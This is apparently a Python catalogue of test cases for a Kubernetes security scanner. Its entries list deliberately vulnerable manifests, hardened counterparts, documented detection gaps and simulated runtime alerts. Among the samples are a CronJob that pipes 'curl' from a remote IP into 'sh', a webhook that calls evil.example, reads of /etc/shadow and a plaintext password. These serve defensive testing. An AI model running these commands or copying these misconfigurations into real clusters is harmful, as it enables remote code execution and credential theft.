add(Entry("FP-SEC", "FP", "ConfigMap key containing the word 'token' that is not a credential",
          [_configmap(SECURE, "fp-model-config", {"max_tokens": "256"})],
          "ConfigMap", SECURE, "fp-model-config", [],
          "'max_tokens' is an LLM sampling limit. A keyword rule matches 'token'.",
          fp_probe=True, negative=True, profile="both"))
add(Entry("GAP-SEC1", "GAP", "Plaintext credentials stored in a Secret object",
          [{"apiVersion": "v1", "kind": "Secret", "metadata": {"name": "db-credentials",
                                                              "namespace": VULN},
            "type": "Opaque", "stringData": {"password": "S3cr3t-Passw0rd!"}}],
          "Secret", VULN, "db-credentials", [],
          "Secret values are never read by the scanner, on purpose.", "MEDIUM", "T1552.007",
          gap=True, gap_reason="the scanner does not read Secret contents (least privilege)",
          would_detect_with="secret scanning at commit time (gitleaks) or an admission policy"))
add(Entry("GAP-SEC2", "GAP", "Long-lived ServiceAccount token stored as a Secret",
          [{"apiVersion": "v1", "kind": "Secret",
            "metadata": {"name": "legacy-sa-token", "namespace": VULN,
                         "annotations": {"kubernetes.io/service-account.name": "default"}},
            "type": "kubernetes.io/service-account-token"}],
          "Secret", VULN, "legacy-sa-token", [],
          "A non-expiring token that never rotates.", "HIGH", "T1528",
          gap=True, gap_reason="no rule inspects Secret type or token age",
          would_detect_with="list Secrets by type (metadata only) and flag service-account-token"))

# ---- attack surface -----------------------------------------------------------------------------------
add(Entry("AS-01", "AS", "One ServiceAccount reused by 3 workloads across 2 namespaces",
          [_sa(VULN, "shared-sa"), _sa(BASE, "shared-sa"),
           _wl("Deployment", VULN, "as-fanout-a", sa="shared-sa"),
           _wl("Deployment", VULN, "as-fanout-b", sa="shared-sa"),
           _wl("Deployment", BASE, "as-fanout-c", sa="shared-sa")],
          "ServiceAccount", None, "shared-sa", ["as-sa-fanout"],
          "A compromise of any one inherits the identity of all.", "MEDIUM", "T1078.004"))
add(Entry("NEG-AS", "NEG", "A ServiceAccount used by only two workloads",
          [_sa(SECURE, "pair-sa"), _wl("Deployment", SECURE, "neg-pair-a", sa="pair-sa"),
           _wl("Deployment", SECURE, "neg-pair-b", sa="pair-sa")],
          "ServiceAccount", None, "pair-sa", [], negative=True, profile="both"))

# ---- control plane & audit (fixture only) -----------------------------------------------------------------------
CP_VULN = {"kind": "ComponentConfig", "metadata": {"name": "control-plane"}, "spec": {
    "version": "v1.29.4",
    "apiServer": {"anonymousAuth": False, "insecurePort": 0, "auditLogPath": "/var/log/audit.log",
                  "encryptionProvider": "",
                  "flags": {"anonymous-auth": "false", "audit-log-path": "/var/log/audit.log",
                            "audit-log-maxage": "7", "audit-log-maxbackup": "2",
                            "audit-log-maxsize": "10", "authorization-mode": "Node,RBAC"}}}}
CP_HARD = {"kind": "ComponentConfig", "metadata": {"name": "control-plane"}, "spec": {
    "version": "v1.29.4",
    "apiServer": {"anonymousAuth": False, "insecurePort": 0, "auditLogPath": "/var/log/audit.log",
                  "encryptionProvider": "/etc/kubernetes/enc.yaml",
                  "flags": {"anonymous-auth": "false", "audit-log-path": "/var/log/audit.log",
                            "audit-policy-file": "/etc/kubernetes/audit.yaml",
                            "audit-log-maxage": "30", "audit-log-maxbackup": "10",
                            "audit-log-maxsize": "100", "authorization-mode": "Node,RBAC",
                            "encryption-provider-config": "/etc/kubernetes/enc.yaml"}}}}
for _eid, _t, _rule, _res, _sev in (
        ("CP-01", "API server has no audit policy", "log-audit-policy-missing", "apiServer", "HIGH"),
        ("CP-02", "Audit logs kept 7 days", "log-audit-retention-short", "apiServer", "MEDIUM"),
        ("CP-03", "Audit log rotation too aggressive", "log-audit-rotation-weak", "apiServer",
         "MEDIUM")):
    add(Entry(_eid, "CP", _t, [], "ControlPlane", None, _res, [_rule], "", _sev, "T1562.008",
              fixture_only=True))
add(Entry("CP-04", "CP", "No in-cluster log collector", [], "Cluster", None, "log-pipeline",
          ["log-no-collector"], "Logs exist only on the node; clearing them leaves no copy.",
          "MEDIUM", "T1070", fixture_only=True))
# the hardened counterpart of those four: a collector and a healthy control plane.
LOG_COLLECTOR = _wl("DaemonSet", "logging", "fluent-bit")
add(Entry("NEG-CP", "NEG", "Healthy control plane flags and a log collector",
          [_ns("logging", psa="restricted"), LOG_COLLECTOR,
           {"apiVersion": "networking.k8s.io/v1", "kind": "NetworkPolicy",
            "metadata": {"name": "default-deny-all", "namespace": "logging"},
            "spec": {"podSelector": {}, "policyTypes": ["Ingress", "Egress"]}}],
          "ControlPlane", None, "apiServer", [],
          "", negative=True, fixture_only=True, profile="hardened-only"))

# ---- image & supply chain: documented gaps -------------------------------------------------------------------------
add(Entry("GAP-IMG1", "GAP", "Image with known CVEs (nginx 1.14.0)",
          [_wl("Deployment", VULN, "gap-cve-image", _mod({"image": "nginx:1.14.0"}))],
          "Deployment", VULN, "gap-cve-image", [],
          "A pinned tag that is nonetheless years out of date.", "HIGH", "T1190",
          gap=True, gap_reason="no image/CVE scanner runs in the offline fixture",
          would_detect_with="run with --live --grype (Grype on the running image digests)",
          grype_expect=["workload-image-vulnerabilities"]))
add(Entry("GAP-IMG2", "GAP", "Image pulled from an untrusted public registry",
          [_wl("Deployment", VULN, "gap-untrusted-registry",
               _mod({"image": "registry.untrusted.invalid/team/app:2.0"}))],
          "Deployment", VULN, "gap-untrusted-registry", [],
          "Not from the organisation's registry, not signed, no digest.", "MEDIUM", "T1525",
          gap=True, gap_reason="no registry allow-list or signature check",
          would_detect_with="admission policy (Kyverno/Gatekeeper) + cosign verification"))

# ---- other documented gaps --------------------------------------------------------------------------------------------
add(Entry("GAP-WL2", "GAP", "CronJob that downloads and runs a script",
          [_wl("CronJob", VULN, "gap-cron-curl-sh", _mod(
              {"command": ["/bin/sh", "-c", "curl -s http://198.51.100.9/x.sh | sh"]}))],
          "CronJob", VULN, "gap-cron-curl-sh", [],
          "Classic persistence. Statically it is just a command line.", "HIGH", "T1053.003",
          gap=True, gap_reason="no static rule inspects commands; the dedicated rule was removed "
                               "in the scope reduction", would_detect_with="Falco at runtime"))
add(Entry("GAP-ADM", "GAP", "Mutating webhook that fails open and injects a sidecar",
          [{"apiVersion": "admissionregistration.k8s.io/v1", "kind": "MutatingWebhookConfiguration",
            "metadata": {"name": "dvka-sidecar-injector"},
            "webhooks": [{"name": "inject.dvka.example", "failurePolicy": "Ignore",
                          "sideEffects": "None", "admissionReviewVersions": ["v1"],
                          "clientConfig": {"url": "https://evil.example/mutate"},
                          "rules": [{"apiGroups": [""], "apiVersions": ["v1"],
                                     "operations": ["CREATE"], "resources": ["pods"]}]}]}],
          "MutatingWebhookConfiguration", None, "dvka-sidecar-injector", [],
          "An external webhook that can rewrite every pod, and fails open.", "HIGH", "T1554",
          gap=True, gap_reason="the admission-control rules were removed in the scope reduction",
          would_detect_with="restore the admission rules (evidence is still collected)"))
add(Entry("GAP-OPS", "GAP", "No ResourceQuota, LimitRange or PodDisruptionBudget",
          [], "Namespace", None, VULN, [],
          "A single tenant can exhaust the node, and a drain can take the app down.", "LOW",
          "T1499", gap=True, gap_reason="the scanner now READS these kinds but has no rule on them",
          would_detect_with="rules over ResourceQuota / LimitRange / PodDisruptionBudget"))

# ---- attack path & prioritisation: two identical privileged workloads ---------------------------------------------------------
_priv = {"securityContext": {"privileged": True, "allowPrivilegeEscalation": True}}
add(Entry("AP-01", "AP", "Internet -> Service -> privileged Pod -> ServiceAccount -> Secrets",
          [_sa(VULN, "ap-frontend-sa"),
           _wl("Deployment", VULN, "ap-frontend", _mod(_priv), sa="ap-frontend-sa"),
           _svc(VULN, "ap-frontend", {"app": "ap-frontend"}, "LoadBalancer"),
           _crb("ap-frontend-secrets", "dvka-secret-reader",
                [{"kind": "ServiceAccount", "name": "ap-frontend-sa", "namespace": VULN}])],
          "Deployment", VULN, "ap-frontend",
          ["workload-privileged-container", "workload-allow-priv-escalation", "net-lb-no-source-range"],
          "The slide's scenario: reachable from the Internet, runs privileged, and its identity "
          "can read every Secret.", "CRITICAL", "T1190 -> T1610 -> T1552.007"))
add(Entry("PRIO-01", "PRIO", "Same flaw, but not reachable: isolated privileged workload",
          [_wl("Deployment", VULN, "prio-isolated", _mod(_priv)),
           _svc(VULN, "prio-isolated", {"app": "prio-isolated"})],
          "Deployment", VULN, "prio-isolated",
          ["workload-privileged-container", "workload-allow-priv-escalation"],
          "Identical to ap-frontend minus the exposure and the identity. It must rank BELOW it.",
          "CRITICAL", "T1610"))

add(Entry("PRIO-02", "PRIO", "Same vulnerable image as GAP-IMG1, but Internet-exposed",
          [_wl("Deployment", VULN, "prio-vuln-exposed", _mod({"image": "nginx:1.14.0", "resources": {
              "limits": {"cpu": "100m", "memory": "64Mi"}, "requests": {"cpu": "10m", "memory": "16Mi"}}})),
           _svc(VULN, "prio-vuln-exposed", {"app": "prio-vuln-exposed"}, "LoadBalancer")],
          "Deployment", VULN, "prio-vuln-exposed", ["net-lb-no-source-range"],
          "Identical image to the isolated gap-cve-image, behind a LoadBalancer. With --grype its "
          "CVE finding must rank ABOVE the isolated one.", "HIGH", "T1190",
          grype_expect=["workload-image-vulnerabilities"]))

# ---- runtime scenarios (Falco-style events; scored on correlation tier) -------------------------------------------------------
RUNTIME = [
    {"id": "RT-01", "title": "Shell in the privileged frontend", "expect": "confirmed",
     "why": "names a pod of ap-frontend, which has Execution-tagged findings",
     "event": {"rule": "Terminal shell in container", "namespace": VULN,
               "pod": "ap-frontend-7d9c8b6f5-x2k4p", "proc": "sh", "tags": ["T1059", "mitre_execution"]}},
    {"id": "RT-02", "title": "Read /etc/shadow in a pod with an auto-mounted token",
     "expect": "confirmed", "why": "names a pod of wl-sa-automount (Credential Access)",
     "event": {"rule": "Read sensitive file untrusted", "namespace": VULN,
               "pod": "wl-sa-automount-6b8f7c9d4-q7w2z", "file": "/etc/shadow", "proc": "cat",
               "tags": ["T1555", "mitre_credential_access"]}},
    {"id": "RT-03", "title": "Shell in a pod the scan has never seen", "expect": "corroborated",
     "why": "same namespace and tactic as real findings, but no resource-level link",
     "event": {"rule": "Terminal shell in container", "namespace": VULN,
               "pod": "dvka-ghost-5f4d3c2b1-abcde", "proc": "bash", "tags": ["T1059", "mitre_execution"]}},
    {"id": "RT-04", "title": "Shell in a cluster whose scan found nothing", "expect": "runtime-only",
     "against": "hardened",
     "why": "the hardened cluster has no static finding of any tactic, so nothing can match",
     "event": {"rule": "Terminal shell in container", "namespace": SECURE,
               "pod": "neg-pair-a-6c5b4a3d2-zxcvb", "proc": "sh", "tags": ["T1059", "mitre_execution"]}},
]
RUNTIME.append(
    {"id": "RT-06", "title": "Shell in a clean namespace of a cluster with other findings",
     "expect": "corroborated",
     "why": "documented behaviour: same tactic elsewhere in the cluster is corroborated, not "
            "runtime-only (core/correlation.py). Whether that is too generous is a design question.",
     "event": {"rule": "Terminal shell in container", "namespace": SECURE,
               "pod": "neg-pair-a-6c5b4a3d2-zxcvb", "proc": "sh",
               "tags": ["T1059", "mitre_execution"]}})
# a deliberately tight boundary: a name that merely shares a prefix is NOT the same workload
RUNTIME.append(
    {"id": "RT-05", "title": "Pod name that only shares a prefix with a flaw", "expect": "corroborated",
     "why": "'wl-sa-automount-extra' is a different workload than 'wl-sa-automount'",
     "event": {"rule": "Read sensitive file untrusted", "namespace": VULN,
               "pod": "wl-sa-automount-extra-6b8f7c9d4-q7w2z", "file": "/etc/shadow", "proc": "cat",
               "tags": ["T1555", "mitre_credential_access"]}})

# ---- hardened workloads shared by both profiles ------------------------------------------------------------------------------------
add(Entry("NEG-WL", "NEG", "A fully hardened workload (every pod-security control on)",
          [_wl("Deployment", SECURE, "neg-api", sa="neg-api-sa"), _sa(SECURE, "neg-api-sa")],
          "Deployment", SECURE, "neg-api", [], negative=True, profile="both"))


def by_id():
    return {e.id: e for e in ENTRIES}
